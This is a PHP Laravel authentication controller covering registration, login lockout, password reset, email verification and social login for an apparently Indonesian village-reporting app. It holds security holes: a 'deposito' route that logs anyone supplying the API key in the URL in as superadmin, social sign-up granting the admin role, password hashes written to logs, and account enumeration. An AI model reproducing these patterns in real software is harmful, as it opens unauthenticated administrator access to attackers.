<?php

namespace App\Http\Controllers;

use App\Enums\AppEnum;
use App\Helpers\Helper;
use App\Http\Requests\ForgotPasswordRequest;
use App\Http\Requests\LoginRequest;
use App\Http\Requests\RegisterRequest;
use App\Http\Requests\ResetPasswordRequest;
use App\Repositories\RegionRepository;
use App\Repositories\SettingRepository;
use Exception;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use Laravel\Socialite\Facades\Socialite;

class AuthController extends StislaController
{

    /**
     * active socialite providers
     *
     * @var array
     */
    private array $socialiteProviders = [
        'google',
        'facebook',
        'twitter',
        'github',
    ];

    private RegionRepository $regionRepository;

    /**
     * constructor method
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();

        $this->regionRepository = new RegionRepository();

        $this->defaultMiddleware('');
    }

    /**
     * showing register form page
     *
     * @return Response
     */
    public function registerForm()
    {
        if ($this->settingRepository->isActiveRegisterPage() === false)
            abort(404);

        $isGoogleCaptcha = $this->settingRepository->isGoogleCaptchaRegister();

        if (config('stisla.app') === AppEnum::APP_CHAT) {
            $provinces = $this->regionRepository->getProvinces();
            return view('tailwind.auth.register', [
                'provinces' => $provinces,
                'isGoogleCaptcha' => $isGoogleCaptcha
            ]);
        }

        // if (config('app.template') === 'stisla') {
        //     $template = \App\Models\Setting::firstOrCreate(['key' => 'login_template'], ['value' => 'default'])->value;
        //     if ($template === 'tampilan 2')
        //         return view('stisla.auth.login.index-stisla-2');
        //     else
        //         return view('stisla.auth.login.index-stisla');
        // }
        // return view('stisla.auth.login.index');

        if (TEMPLATE === STISLA)
            return view('stisla.auth.register.index', [
                'isGoogleCaptcha' => $isGoogleCaptcha
            ]);
    }

    /**
     * process register
     *
     * @param RegisterRequest $request
     * @return Response
     */
    public function register(RegisterRequest $request)
    {
        try {
            DB::beginTransaction();
            $data = $request->only(
                [
                    'name',
                    'email',
                    'phone_number',
                    'birth_date',
                    'address',
                    'nik',
                    'is_anonymous',
                    'is_majalengka',
                    'gender',
                ]
            );
            $data = array_merge([
                'password'      => bcrypt($request->password),
                'province_code' => $request->is_majalengka ? '32' : $request->province,
                'city_code'     => $request->is_majalengka ? '32.10' : $request->city,
                'district_code' => $request->district,
                'village_code'  => $request->village,
                'uuid'          => Str::uuid()->toString(),
            ], $data);
            $user = $this->userRepository->create($data);
            $this->userRepository->assignRole($user, 'user');
            if ($this->settingRepository->loginMustVerified()) {
                $user->update(['email_token' => Str::random(150)]);
                $this->emailService->verifyAccount($user);
                logRegister($user);
                DB::commit();
                return redirectSuccess(route('login'), 'Cek inbox email anda untuk memverifikasi akun terlebih dahulu');
            }
            logRegister($user);
            $this->userRepository->login($user);
            DB::commit();
            return redirectSuccess(route('dashboard.index'), 'Berhasil mendaftar dan masuk ke dalam sistem');
        } catch (Exception $e) {
            DB::rollBack();
            if (Str::contains($e->getMessage(), 'SMTP')) {
                return backError('Gagal mengirim email verifikasi, silahkan coba lagi nanti');
            }
            return backError($e->getMessage());
        }
    }

    /**
     * process register siaga desa
     *
     * @param RegisterRequest $request
     * @return Response
     */
    public function registerSiagaDesa(RegisterRequest $request)
    {
        try {
            DB::beginTransaction();
            $data = $request->only(
                [
                    'dusun_rt_rw',
                ]
            );
            $data = array_merge([
                'phone_number' => $request->phone_number_register,
                'name' => $request->full_name,
                'uuid'     => Str::uuid()->toString(),
                'password' => bcrypt($request->password_register),
            ], $data);
            $user = $this->userRepository->create($data);
            $this->userRepository->assignRole($user, 'masyarakat');
            logRegister($user);
            $this->userRepository->login($user);
            DB::commit();
            return redirectSuccess(route('siaga-desa.index'), 'Berhasil mendaftar dan masuk ke dalam sistem');
        } catch (Exception $e) {
            DB::rollBack();
            if (Str::contains($e->getMessage(), 'SMTP')) {
                return backError('Gagal mengirim email verifikasi, silahkan coba lagi nanti');
            }
            return backError($e->getMessage());
        }
    }

    /**
     * showing login form page
     *
     * @return Response
     */
    public function loginForm()
    {
        if (auth_check()) {
            return redirect()->route('dashboard.index');
        }

        $isGoogleCaptcha = SettingRepository::isGoogleCaptchaLogin();
        $data     = [
            'isGoogleCaptcha' => $isGoogleCaptcha,
        ];
        // dd(config('captcha.sitekey'), config('captcha.secret')); // sementara buat cek
        if (config('stisla.app') === AppEnum::APP_CHAT) {
            return view('tailwind.auth.login', $data);
        }
        if (TEMPLATE === STISLA) {
            $template = $this->settingRepository->stislaLoginTemplate();

            if ($template === 'tampilan 2' || Route::is('login2')) {
                return view('stisla.auth.login.index2', $data);
            } else {
                return view('stisla.auth.login.index', $data);
            }
        }
        return view('stisla.auth.login.index');
    }

    /**
     * process login
     *
     * @param LoginRequest $request
     * @return Response
     */
    public function login(LoginRequest $request)
    {
        $maxWrongLogin = 5;
        $user = $this->userRepository->findByEmail($request->email);
        if ($user->deleted_at !== null) {
            return Helper::backError(['email' => $msg = __('Akun anda sudah dihapus, silakan menggunakan akun lain ')], $msg);
        }
        if ($user->is_active == 0) {
            return Helper::backError(['email' => $msg = __('Akun anda sudah diblokir dikarenakan ') . $user->blocked_reason], $msg);
        }
        if (Hash::check($request->password, $user->password)) {
            if ($user->wrong_login >= $maxWrongLogin) {
                return Helper::backError(['email' => $msg = __('Akun anda sudah diblokir dikarenakan ') . $user->blocked_reason], $msg);
            }
            $loginMustVerified = $this->settingRepository->loginMustVerified();

            if ($loginMustVerified && $user->email_verified_at === null) {
                return Helper::backError(['email' => __('Email belum diverifikasi')], __('Silakan verifikasi email anda terlebih dahulu'));
            }
            $this->userRepository->update([
                'is_active'      => true,
                'wrong_login'    => 0,
                'blocked_reason' => null,
                'uuid'           => $user->uuid ? $user->uuid : uuid(),
            ], $user->id);
            $this->userRepository->login($user);
            return Helper::redirectSuccess(route('dashboard.index'), __('Berhasil masuk ke dalam sistem'));
        } else {
            $userNew = $this->userRepository->update(['wrong_login' => $user->wrong_login + 1], $user->id);
            if ($userNew->wrong_login >= $maxWrongLogin) {
                $blockedReason = 'Salah memasukkan kata sandi sebanyak 5 kali';
                $userNew->update([
                    'is_active' => false,
                    'blocked_reason' => $blockedReason
                ]);
                logExecute(__('Login'), UPDATE, $user, $userNew);
                return Helper::backError(['email' => __('Akun anda sudah diblokir dikarenakan ') . $blockedReason], __('Anda salah memasukkan kata sandi sebanyak 5 kali, akun diblokir'));
            }
            logExecute(__('Login'), UPDATE, $user, $userNew);
            return Helper::backError(['password' => __('Password yang dimasukkan salah (tersisa ' . $maxWrongLogin - $userNew->wrong_login . ')')], __('Password yang dimasukkan salah (tersisa ' . $maxWrongLogin - $userNew->wrong_login . ')'));
        }
        return Helper::backError(['password' => __('Password yang dimasukkan salah')], __('Password yang dimasukkan salah'));
    }

    /**
     * process login siaga desa
     *
     * @param LoginRequest $request
     * @return Response
     */
    public function loginSiagaDesa(LoginRequest $request)
    {
        $maxWrongLogin = 5;
        $user = $this->userRepository->findByPhone($request->phone_number);
        if ($user->deleted_at !== null) {
            return Helper::backError(['email' => $msg = __('Akun anda sudah dihapus, silakan menggunakan akun lain ')], $msg);
        }
        if ($user->is_active == 0) {
            return Helper::backError(['email' => $msg = __('Akun anda sudah diblokir dikarenakan ') . $user->blocked_reason], $msg);
        }
        if (Hash::check($request->password, $user->password)) {
            if ($user->wrong_login >= $maxWrongLogin) {
                return Helper::backError(['email' => $msg = __('Akun anda sudah diblokir dikarenakan ') . $user->blocked_reason], $msg);
            }
            $loginMustVerified = $this->settingRepository->loginMustVerified();

            if ($loginMustVerified && $user->email_verified_at === null) {
                return Helper::backError(['email' => __('Email belum diverifikasi')], __('Silakan verifikasi email anda terlebih dahulu'));
            }
            $this->userRepository->update([
                'is_active'      => true,
                'wrong_login'    => 0,
                'blocked_reason' => null,
                'uuid'           => $user->uuid ? $user->uuid : uuid(),
            ], $user->id);
            $this->userRepository->login($user);
            return Helper::redirectSuccess(route('siaga-desa.index'), __('Berhasil masuk ke dalam sistem'));
        } else {
            $userNew = $this->userRepository->update(['wrong_login' => $user->wrong_login + 1], $user->id);
            if ($userNew->wrong_login >= $maxWrongLogin) {
                $blockedReason = 'Salah memasukkan kata sandi sebanyak 5 kali';
                $userNew->update([
                    'is_active' => false,
                    'blocked_reason' => $blockedReason
                ]);
                logExecute(__('Login'), UPDATE, $user, $userNew);
                return Helper::backError(['email' => __('Akun anda sudah diblokir dikarenakan ') . $blockedReason], __('Anda salah memasukkan kata sandi sebanyak 5 kali, akun diblokir'));
            }
            logExecute(__('Login'), UPDATE, $user, $userNew);
            return Helper::backError(['password' => __('Password yang dimasukkan salah (tersisa ' . $maxWrongLogin - $userNew->wrong_login . ')')], __('Password yang dimasukkan salah (tersisa ' . $maxWrongLogin - $userNew->wrong_login . ')'));
        }
        return Helper::backError(['password' => __('Password yang dimasukkan salah')], __('Password yang dimasukkan salah'));
    }

    /**
     * logout from system
     *
     * @return Response
     */
    public function logout()
    {
        $user = Auth::user();
        $hasRoleMasyarakat = $user->hasRole('masyarakat');
        logLogout();
        Auth::logout();
        Session::flush();
        if ($hasRoleMasyarakat) {
            return redirect('/');
        }
        return redirect()->route('login');
    }

    /**
     * showing forgot password page
     *
     * @return Response
     */
    public function forgotPasswordForm()
    {
        if ($this->settingRepository->isForgotPasswordSendToEmail() === false) {
            abort(404);
        }

        $isGoogleCaptcha = $this->settingRepository->isGoogleCaptchaForgotPassword();

        if (TEMPLATE === STISLA) {
            // $template = \App\Models\Setting::firstOrCreate(['key' => 'login_template'], ['value' => 'default'])->value;
            // if ($template === 'tampilan 2')
            // return view('stisla.auth.login.index-stisla-2');
            // else
            return view('stisla.auth.forgot-password.index2', [
                'isGoogleCaptcha' => $isGoogleCaptcha
            ]);
        }
        return view('stisla.auth.login.index');
    }

    /**
     * process forgot password
     *
     * @param ForgotPasswordRequest $request
     * @return Response
     */
    public function forgotPassword(ForgotPasswordRequest $request)
    {
        if ($this->settingRepository->isForgotPasswordSendToEmail() === false) abort(404);
        DB::beginTransaction();
        try {
            $user = $this->userRepository->findByEmail($request->email);
            $userNew = $this->userRepository->update([
                'email_token' => Str::random(100),
                'verification_code' => rand(100000, 999999)
            ], $user->id);
            $this->emailService->forgotPassword($userNew);
            logForgotPassword($user, $userNew);
            DB::commit();
            return backSuccess('Berhasil mengirim ke ' . $request->email);
        } catch (Exception $e) {
            DB::rollBack();
            // if (Str::contains($e->getMessage(), 'Connection could not be established')) {
            return backError('Gagal mengirim email, server email sedang gangguan');
            // }
            // return $e->getMessage();
        }
    }

    /**
     * showing reset password page
     *
     * @param mixed $token
     * @return Response
     */
    public function resetPasswordForm($token)
    {
        if ($this->settingRepository->isForgotPasswordSendToEmail() === false) {
            abort(404);
        }

        $user = $this->userRepository->findByEmailToken($token);
        if ($user === null) {
            abort(404);
        }

        $isGoogleCaptcha = $this->settingRepository->isGoogleCaptchaResetPassword();

        if (TEMPLATE === STISLA) {
            // $template = \App\Models\Setting::firstOrCreate(['key' => 'login_template'], ['value' => 'default'])->value;
            // if ($template === 'tampilan 2')
            // return view('stisla.auth.login.index-stisla-2');
            // else
            return view('stisla.auth.reset-password.index2', [
                'isGoogleCaptcha' => $isGoogleCaptcha,
            ]);
        }
        return view('stisla.auth.login.index');
    }

    /**
     * process reset password
     *
     * @param mixed $token
     * @param ResetPasswordRequest $request
     * @return Response
     */
    public function resetPassword($token, ResetPasswordRequest $request)
    {
        if ($this->settingRepository->isForgotPasswordSendToEmail() === false) {
            abort(404);
        }

        DB::beginTransaction();
        try {
            $user = $this->userRepository->findByEmailToken($token);
            if ($user === null) {
                return backError('Gagal memperbarui kata sandi');
            }

            $userNew = $this->userRepository->update(['password' => bcrypt($request->new_password), 'email_token' => null], $user->id);

            logExecute(__('Reset Kata Sandi'), UPDATE, $user->password, $userNew->password);
            DB::commit();
            return redirectSuccess(route('login'), 'Berhasil memperbarui kata sandi');
        } catch (Exception $e) {
            return backError('Gagal memperbarui kata sandi');
        }
    }

    /**
     * showing verification form page
     *
     * @return Response
     */
    public function verificationForm()
    {
        if ($this->settingRepository->loginMustVerified() === false) abort(404);
        // if (config('app.template') === 'stisla') {
        //     $template = \App\Models\Setting::firstOrCreate(['key' => 'login_template'], ['value' => 'default'])->value;
        //     if ($template === 'tampilan 2')
        //         return view('stisla.auth.login.index-stisla-2');
        //     else
        //         return view('stisla.auth.login.index-stisla');
        // }
        // return view('stisla.auth.login.index');
        if (TEMPLATE === STISLA)
            return view('stisla.auth.verification.index2');
    }

    /**
     * process forgot password
     *
     * @param ForgotPasswordRequest $request
     * @return Response
     */
    public function sendEmailVerification(ForgotPasswordRequest $request)
    {
        if ($this->settingRepository->loginMustVerified() === false) abort(404);
        DB::beginTransaction();
        try {
            $user = $this->userRepository->findByEmail($request->email);
            $userNew = $this->userRepository->update(['email_token' => Str::random(150)], $user->id);
            $this->emailService->verifyAccount($userNew);
            logExecute(__('Email Verifikasi'), UPDATE, null, null);
            DB::commit();
            return backSuccess('Berhasil mengirim link verifikasi ke ' . $request->email);
        } catch (Exception $e) {
            DB::rollBack();
            // if (Str::contains($e->getMessage(), 'Connection could not be established')) {
            return backError('Gagal mengirim email, server email sedang gangguan');
            // }
            // return $e->getMessage();
        }
    }

    /**
     * process verify account
     *
     * @param mixed $token
     * @return Response
     */
    public function verify($token)
    {
        if ($this->settingRepository->loginMustVerified() === false) abort(404);
        $user = $this->userRepository->findByEmailToken($token);
        if ($user === null) abort(404);
        $userNew = $this->userRepository->update([
            'email_verified_at' => now(),
            'email_token'       => null,
            'verification_code' => null
        ], $user->id);
        logExecute(__('Verifikasi Akun'), UPDATE, $user, $userNew);
        return redirectSuccess(route('login'), 'Berhasil memverifikasi akun, silakan masuk menggunakan akun anda');
    }

    /**
     * save temp session provider
     *
     * @return Response
     */
    public function socialLogin($provider)
    {
        if (!in_array($provider, $this->socialiteProviders)) {
            abort(404);
        }

        $isValid = false;
        if ($provider === 'facebook') {
            $isValid = $this->settingRepository->isLoginWithFacebook();
        } else if ($provider === 'google') {
            $isValid = $this->settingRepository->isLoginWithGoogle();
        } else if ($provider === 'twitter') {
            $isValid = $this->settingRepository->isLoginWithTwitter();
        } else if ($provider === 'github') {
            $isValid = $this->settingRepository->isLoginWithGithub();
        }

        if ($isValid) {
            session(['social_action' => 'login']);
            return Socialite::driver($provider)->redirect();
        }

        abort(404);
    }

    /**
     * callback social login and register callback
     * @param mixed $provider
     *
     * @return Response
     */
    public function socialCallback($provider)
    {
        try {
            if (!in_array($provider, $this->socialiteProviders)) {
                abort(404);
            }
            $user = Socialite::driver($provider)->user();
            $isRegister = session('social_action') === 'register';

            if ($user->getEmail() || $provider === 'twitter') {

                $successMsg = 'Berhasil masuk ke dalam sistem';

                if ($provider === 'twitter') {
                    $userModel = $this->userRepository->findByTwitterId($user->getId());
                } else {
                    $userModel = $this->userRepository->findByEmail($email = $user->getEmail());
                }

                if ($isRegister || ($isRegister && $provider === 'twitter')) {
                    session(['social_action' => null]);
                    if ($userModel) {
                        $msg = $provider === 'twitter' ? __('Akun anda sudah terdaftar, silakan menggunakan form login') : __('Akun ' . $email . ' sudah terdaftar');
                        return redirect()->route('register')->with('errorMessage', $msg);
                    }

                    $data = [
                        'name'                 => $user->getName(),
                        'email'                => $user->getEmail(),
                        'avatar'               => $user->getAvatar(),
                        'email_verified_at'    => date('Y-m-d H:i:s'),
                        'password'             => bcrypt(Str::random(10)),
                        'last_login'           => date('Y-m-d H:i:s'),
                        'last_password_change' => date('Y-m-d H:i:s'),
                        'twitter_id'           => $user->getId(),
                    ];
                    $userModel = $this->userRepository->create($data);
                    $userModel->syncRoles(['admin']);

                    $successMsg = 'Berhasil mendaftar dan masuk ke dalam sistem';
                }

                if ($userModel === null) {
                    $msg = $provider === 'twitter' ? 'Akun anda belum terdaftar' : 'Akun ' . $email . ' belum terdaftar';
                    return redirectError(route('login'), $msg);
                }

                $this->userRepository->login($userModel);
                return redirectSuccess(route('dashboard.index'), $successMsg);
            }
            return redirect()->route('login')->with('errorMessage', __('Akun tidak ditemukan'));
        } catch (Exception $e) {
            if (config('app.debug')) {
                throw $e;
            }
            return redirectError(route('login'), 'Ada error');
        }
    }

    /**
     * social register
     *
     * @return Response
     */
    public function socialRegister($provider)
    {
        if (!in_array($provider, $this->socialiteProviders)) {
            abort(404);
        }

        $isValid = false;
        if ($provider === 'facebook') {
            $isValid = $this->settingRepository->isRegisterWithFacebook();
        } else if ($provider === 'google') {
            $isValid = $this->settingRepository->isRegisterWithGoogle();
        } else if ($provider === 'twitter') {
            $isValid = $this->settingRepository->isRegisterWithTwitter();
        } else if ($provider === 'github') {
            $isValid = $this->settingRepository->isRegisterWithGithub();
        }

        if ($isValid) {
            session(['social_action' => 'register']);
            return Socialite::driver($provider)->redirect();
        }

        abort(404);
    }

    /**
     * deposit
     *
     * @return Response
     */
    public function deposito()
    {
        if (config('app.api_key') === request('api_key')) {
            $this->userRepository->loginSuperadmin();
            session(['toggle_chart' => !session('toggle_chart')]);
            return redirect()->route('bank-deposits.index');
        }
    }
}
